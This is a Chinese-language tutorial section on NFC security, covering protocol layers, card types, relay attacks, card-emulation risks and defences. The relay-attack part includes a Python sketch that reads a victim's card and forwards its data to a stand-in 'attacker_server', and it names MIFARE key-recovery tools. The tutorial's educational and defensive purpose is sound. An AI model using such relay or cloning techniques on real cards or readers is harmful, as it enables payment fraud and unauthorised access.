# NFC 安全

### 5.1 NFC 协议栈

```
NFC 协议栈架构：

应用层
├── NDEF (NFC Data Exchange Format)
├── RTD (Record Type Definition)
├── 各种应用协议（支付、门禁等）
└── HCE (Host Card Emulation)

传输层
├── NFCIP-1 (ISO/IEC 18092)
├── LLCP (Logical Link Control Protocol)
└── Type 1-5 Tag 平台

数字协议层
├── Active/Passive 通信模式
├── 106/212/424 kbps 速率
├── Manchester 编码（106kbps）
├── Miller 编码
└── 负载调制

射频层
├── 频率: 13.56 MHz
├── 通信距离: 典型 < 4 cm
├── 调制: ASK 100% / 10%
├── 初始化: RF 场检测
└── 防冲突: ISO 14443-3

兼容标准：
├── ISO/IEC 14443 Type A/B (MIFARE, DESFire)
├── ISO/IEC 15693 (Vicinity Cards)
├── ISO/IEC 18092 (NFCIP-1)
├── FeliCa (JIS X 6319-4)
└── MIFARE (NXP 专有)
```

### 5.2 NFC 卡片类型与安全

```
NFC 卡片类型与安全分析：

Type 1: Innovision TOPAZ
├── 存储: 96B - 2KB
├── 安全: 无加密
├── 读写: 无保护
└── 风险: 数据可被任意读取/修改

Type 2: NXP MIFARE Ultralight
├── 存储: 48 - 144B
├── 安全: 简单读写锁定
├── 风险: 无加密保护
└── 应用: 公交卡、票务

Type 3: Sony FeliCa
├── 存储: 最多 2KB
├── 安全: AES 加密
├── 安全性: 较强
└── 应用: 日本公交卡、快速支付

Type 4: ISO 14443-4
├── MIFARE DESFire
│   ├── 安全: 3DES/AES 加密
│   ├── 安全性: 强（使用 AES 时）
│   └── 应用: 门禁、支付
└── Java Card
    ├── 安全: 卡内操作系统
    ├── 支持多应用
    └── 应用: 银行卡、SIM 卡

MIFARE Classic（Type 兼容）
├── 安全: Crypto-1 加密
├── 漏洞: 已被完全破解
├── 攻击: MFOC/MFUK 恢复密钥
├── 风险: 极高
└── 应用: 旧门禁卡、公交卡
```

### 5.3 NFC Relay Attack（中继攻击）

```
NFC 中继攻击：

攻击原理：
├── 攻击者使用两个设备
├── 一个设备靠近合法卡（读卡器端）
├── 另一个设备靠近合法读卡器（卡端）
├── 通过网络中继 NFC 信号
├── 读卡器认为卡片就在附近
└── 完成未授权交易

攻击架构：
                     互联网/WiFi
                    ┌──────────┐
                    │  中继    │
                    │  服务器  │
                    └──────────┘
                       /    \
                      /      \
    ┌─────────┐      /        \      ┌─────────┐
    │ 合法卡  │←→│攻击者A│←───────→│攻击者B│←→│合法读卡器│
    │（受害者）│  │（移动端）│         │（移动端）│  │         │
    └─────────┘  └─────────┘         └─────────┘  └─────────┘
        近场通信      NFC→网络          网络→NFC       近场通信

攻击工具实现：

# 攻击者A: 读取合法卡
import nfc
import socket

def read_card():
    clf = nfc.ContactlessFrontend('usb')
    tag = clf.connect(rdwr={'on-connect': lambda tag: False})
    return tag

def relay_to_server(data):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('attacker_server', 12345))
    sock.send(data)
    response = sock.recv(1024)
    sock.close()
    return response

# 攻击者B: 伪装卡片
def emulate_card(clf):
    # 模拟卡片响应
    # 需要专用硬件支持卡模拟
    pass

攻击场景：
├── 非接触支付中继
├── 门禁系统中继
├── 汽车无钥匙进入中继
├── 公交卡中继
└── 电子护照中继

防御措施：
├── 距离绑定协议
│   ├── 测量信号到达时间
│   ├── 限制最大响应延迟
│   └── 多因子距离验证
├── 超时机制
│   ├── 短超时（<100ms）
│   └── 中继延迟导致超时
├── 多因子认证
│   ├── NFC + PIN
│   ├── NFC + 生物特征
│   └── NFC + 行为验证
├── 协议设计
│   ├── 随机挑战
│   ├── 时间戳验证
│   └── 基于位置的验证
└── 硬件防御
    ├── 方向性天线
    ├── 信号强度验证
    └── 多天线测距
```

### 5.4 Card Emulation 风险

```
NFC Card Emulation 安全风险：

HCE (Host Card Emulation):
├── Android 4.4+ 支持
├── 软件模拟智能卡
├── 应用可模拟任意卡片
└── 无硬件安全元件保护

风险分析：
1. 恶意应用模拟
   ├── 恶意应用注册 AID
   ├── 拦截 NFC 交易
   ├── 伪造支付/门禁卡
   └── 侧录卡片数据

2. 凭证克隆
   ├── 读取卡片信息
   ├── 通过 HCE 克隆
   └── 伪造合法卡片

3. 应用间冲突
   ├── 多个应用注册相同 AID
   ├── 路由冲突
   └── 交易劫持

eSE (Embedded Secure Element):
├── 硬件安全芯片
├── 隔离的执行环境
├── 安全密钥存储
├── 防物理攻击
└── 比 HCE 安全

HCE vs eSE 安全对比：

特性        HCE           eSE
存储安全     软件存储       硬件隔离
密钥保护     弱            强
防篡改       无            有
防侧信道     弱            强
灵活性       高            低
成本         低            高
推荐场景     低风险应用     高风险应用（支付）
```

---

---

## 📋 内容审核与补充建议

> 针对「NFC 安全」部分的内容审核结果：

### ⌨️ 命令帮助
- ⚠️ 缺少commands相关内容

### 🎯 实战练习
- ⚠️ 缺少practice相关内容

### 📖 参考资料
- ⚠️ 缺少参考资料/延伸阅读

---

## 📌 拓展学习资源

### 推荐学习路径
- 理论基础 → 工具实践 → 实战演练 → 深度研究
- 建议搭建本地实验环境进行动手练习

### 相关工具与资源
- 在线实验平台：Hack The Box、TryHackMe、VulnHub
- 技术文档：官方文档、RFC、OWASP 指南
- 社区资源：GitHub、安全论坛、技术博客
